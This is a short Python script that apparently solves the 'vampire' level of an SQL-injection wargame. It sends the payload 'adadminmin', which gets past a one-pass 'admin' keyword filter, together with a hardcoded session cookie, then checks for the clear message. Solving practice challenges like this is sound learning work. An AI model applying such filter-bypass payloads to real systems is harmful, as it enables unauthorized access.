import requests

url = 'https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = "?id=adadminmin"

r = requests.get(url + payload, cookies=cookie)
if 'VAMPIRE Clear!' in r.text:
    print('VAMPIRE Clear!')
